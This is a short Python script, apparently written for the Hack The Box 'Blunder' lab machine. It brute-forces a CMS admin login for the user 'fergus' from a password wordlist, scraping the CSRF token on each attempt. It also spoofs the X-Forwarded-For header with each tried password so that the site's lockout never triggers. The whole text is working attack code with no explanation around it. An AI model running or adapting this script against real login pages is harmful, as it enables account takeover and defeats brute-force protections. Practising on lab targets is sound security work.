#!/usr/bin/python3

import requests
import re
url="http://10.10.10.191/admin/login"
passwords="/root/Documents/boxes/blunder/wordlist.txt"


f=open(passwords,"r")
for password in f.readlines():
	passw=password.rstrip()
	print(f'trying: {passw}')
	s=requests.Session()
	c=s.get(url)
	csrf=re.search('input.+?name="tokenCSRF".+?value="(.+?)"', c.text).group(1)


	data={
		'tokenCSRF':csrf,
		'username':'fergus',
		'password':passw,
		'save':''
	}

	headers={
		'X-Forwarded-For': passw,
		'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
		'Referer': url
	}
	result=s.post(url,headers = headers,data = data, allow_redirects=False)
	if 'location' in result.headers:
		if (result.headers['location']!='/admin'):
			print (f'password= {passw}')
			break
